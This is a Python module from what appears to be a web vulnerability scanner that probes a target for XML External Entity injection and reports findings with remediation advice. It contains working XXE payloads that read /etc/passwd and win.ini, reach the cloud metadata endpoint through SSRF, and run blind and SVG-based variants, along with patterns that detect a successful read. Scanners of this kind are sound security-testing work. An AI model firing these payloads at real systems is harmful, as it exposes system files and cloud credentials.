"""
Vexor XXE Scanner
XML External Entity Injection Detection
"""
import asyncio
import re
from vexor.modules.base import BaseScanner, Finding


XXE_PAYLOADS = [
    # Basic file read
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",

    # Windows file read
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>""",

    # SSRF via XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>""",

    # Blind XXE with error
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">
  %eval;
  %error;
]>
<root/>""",

    # XXE via SVG
    """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>""",
]

XXE_SUCCESS_PATTERNS = [
    r"root:x:0:0",
    r"daemon:x:",
    r"\[fonts\]",
    r"ami-id",
    r"instance-id",
    r"/bin/bash",
    r"/bin/sh",
]

XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/xhtml+xml",
    "application/soap+xml",
    "image/svg+xml",
]


class Scanner(BaseScanner):
    """XXE Injection Scanner"""

    MODULE_NAME = "xxe"
    MODULE_DESC = "XML External Entity Injection Detection"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._test_xml_endpoints(),
                self._check_xml_content_type(),
                return_exceptions=True
            )
        return self.findings

    async def _test_xml_endpoints(self) -> None:
        """Test XML endpoints for XXE"""
        # Check if target accepts XML
        for payload in XXE_PAYLOADS[:3]:
            for content_type in XML_CONTENT_TYPES[:2]:
                resp = await self.post(
                    self.target,
                    content=payload.encode(),
                    headers={"Content-Type": content_type}
                )

                if not resp:
                    continue

                if self._has_xxe_success(resp.text):
                    self.add_finding(Finding(
                        severity="CRITICAL",
                        module=self.MODULE_NAME,
                        vuln="XML External Entity (XXE) Injection",
                        endpoint=self.target,
                        payload=payload[:100] + "...",
                        evidence=self._extract_evidence(resp.text),
                        description=(
                            "XXE injection allows reading local files and "
                            "potentially performing SSRF attacks"
                        ),
                        remediation=(
                            "Disable external entity processing in XML parser. "
                            "Use safe XML parsing libraries. "
                            "Validate and sanitize XML input."
                        ),
                    ))
                    return

                # Check for XML parsing errors (indicates XML is processed)
                if self._has_xml_error(resp.text):
                    self.add_finding(Finding(
                        severity="MEDIUM",
                        module=self.MODULE_NAME,
                        vuln="XML Processing Detected — Potential XXE",
                        endpoint=self.target,
                        evidence="XML parsing error in response indicates XML processing",
                        description="Server processes XML input — may be vulnerable to XXE",
                        remediation="Disable external entity processing in XML parser",
                    ))
                    return

    async def _check_xml_content_type(self) -> None:
        """Check if endpoint accepts XML content type"""
        response = await self.get(self.target)
        if not response:
            return

        content_type = response.headers.get("content-type", "")
        if any(xml_ct in content_type for xml_ct in XML_CONTENT_TYPES):
            self.add_finding(Finding(
                severity="INFO",
                module=self.MODULE_NAME,
                vuln="XML Content Type Detected",
                endpoint=self.target,
                evidence=f"Content-Type: {content_type}",
                description="Endpoint uses XML — test for XXE manually",
                remediation="Ensure XML parser has external entities disabled",
            ))

    def _has_xxe_success(self, text: str) -> bool:
        for pattern in XXE_SUCCESS_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    def _has_xml_error(self, text: str) -> bool:
        xml_errors = [
            "XML parsing error", "SAXParseException",
            "XMLSyntaxError", "ParseError",
            "entity", "DOCTYPE",
        ]
        return any(err.lower() in text.lower() for err in xml_errors)

    def _extract_evidence(self, text: str) -> str:
        for pattern in XXE_SUCCESS_PATTERNS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 10)
                end = min(len(text), match.end() + 100)
                return text[start:end].strip()
        return "XXE indicator found"
